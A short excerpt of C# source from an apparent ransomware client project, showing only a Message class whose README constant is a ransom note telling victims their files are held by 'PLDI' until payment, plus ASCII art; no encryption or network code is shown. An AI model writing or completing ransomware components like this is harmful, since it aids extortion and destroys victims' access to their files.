...
namespace RansomwareClient
{
    public class Message
    {
        ...
        public static readonly string README = @"You have been pwned by PLDI and must pay for your files back!
Run the application again and enter a payment confirmation to unlock... or get HaXx0red more, roll the dice! 
                               :oooooooooo:                           
                        ::oOOOOooo:::::ooooO88Oo:                     
                     :oOOo:                   :oO8O:                   
                  :O8O:                           oO8o                 
